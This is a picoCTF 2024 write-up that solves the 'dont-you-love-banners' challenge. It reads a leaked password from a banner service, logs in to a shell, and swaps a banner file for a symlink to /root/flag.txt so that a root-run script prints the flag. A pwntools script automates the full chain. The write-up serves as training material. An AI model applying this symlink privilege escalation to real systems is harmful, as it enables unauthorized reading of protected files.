---
title: ✅ dont-you-love-banners
tags:
  - picoCTF-2024
  - general-skills
date: 2024-10-10
difficulty: Medium
---
# Description 📄

Can you abuse the banner? The server has been leaking some crucial information on `tethys.picoctf.net 64611`. Use the leaked information to get to the server. To connect to the running application use `nc tethys.picoctf.net 57294`. From the above information abuse the machine and find the flag in the `/root` directory.

# Method_1 🧪

- In challenge description it says that "server has been leaking crucial information", so lets connect to server

```bash
telnet tethys.picoctf.net 64611
```

![picoCTF_dont-you-love-banners_img1](https://imgur.com/7PfQdju.png)

```password
My_Passw@rd_@1234
```

- We get the password. Now lets go to next step (connecting using `nc`)

```bash
nc tethys.picoctf.net 57294
```

![picoCTF_dont-you-love-banners_img2](https://imgur.com/nzpteAh.png)

```ans
DEFCON
```

```ans
John Draper
```

- After typing the password and googling for some questions, we are granted **shell** access

![neo-i-am-in](https://i.imgur.com/W20aG4y.gif)

- If we do `ls` and check the files we find the **banner** that we were greeted with when connected using `nc` is in `banner` file and a file called `text` which is clearly there to mock us

![picoCTF_dont-you-love-banners_img3](https://imgur.com/lWA5nBp.png)

<img src="https://i.imgur.com/KdDzHnw.gif" title="source: imgur.com" alt="he-got-some-humor" width="500" />

- We know that the flag is in `/root` so if we go in there and do `ls`, we'll see `flag.txt` which we can't read but there is also a python script called `script.py` which is readable by anyone

![picoCTF_dont-you-love-banners_img4](https://imgur.com/sFl4pGX.png)

- Since the script is owned by **root** we know only root can execute it and after reading the script we get to know that it displays banner from `/home/player/banner`. So one can be that we delete the banner file and make a **system link** to `/root/flag.txt` so that when we log in again the **flag** gets displayed instead of the original banner

```bash
rm /home/player/banner
```

```bash
ln -s /root/flag.txt /home/player/banner
```

```bash
# exit shell and login again
nc tethys.picoctf.net 63490
```

# Method_2 🧪

- I tried to write a script but it didn't work the way i intended. So, now I have to run the script twice to get the flag
- I know my coding skills are bad 🥲

![It is what it is]

## Code

- Remember to edit **port** and run twice to get flag

```python
from pwn import *
import time

hostname = "tethys.picoctf.net"
port = 62793  # Change port to an integer

# Function to connect to the server
def connect_to_server():
    try:
        conn = remote(hostname, port)
        print("Connected")
        return conn
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

# Detecting banner
def identify_banner(conn):
    print("Received banner:\n")
    n = 0
    while n < 10:
        try:
            tmp = conn.recvline(timeout=5).decode()
            print(tmp)  # Display received line
            
            if "?" in tmp:
                global question_1
                question_1 = tmp.strip()
                break
            
            n += 1
        except EOFError:
            print("Server closed the connection unexpectedly.")
            break
        except Exception as e:
            print(f"Error receiving data: {e}")
            break

# Main execution
conn = connect_to_server()
if conn:
    identify_banner(conn)

    print(f"{question_1=}")
    conn.sendline(b"My_Passw@rd_@1234")
    print("Answered: My_Passw@rd_@1234\n")
    time.sleep(1)  # Wait a second before receiving response

    question_2 = conn.recvline(timeout=10).decode().strip()
    print(f"{question_2=}")
    conn.sendline(b"DEFCON")
    print("Answered: DEFCON\n")
    time.sleep(1)

    question_3 = conn.recvline(timeout=10).decode().strip()
    print(f"{question_3=}")
    conn.sendline(b"John Draper")
    print("Answered: John Draper\n")
    time.sleep(1)

    # Receive shell access and running commands
    try:
        print(conn.recv(timeout=10).decode().strip())
        conn.sendline(b"mv /home/player/banner /home/player/banner.old")
        time.sleep(2)  # Wait before receiving response
        print(conn.recv(timeout=10).decode().strip())
        
        conn.sendline(b"ln -s /root/flag.txt /home/player/banner")
        time.sleep(2)
        print(conn.recv(timeout=10).decode().strip())
    except Exception as e:
        print(f"Error during command execution: {e}")

    # Closing connection
    conn.close()

    print("If you didn't get the flag then run again")
else:
    print("Unable to connect to the server.")
```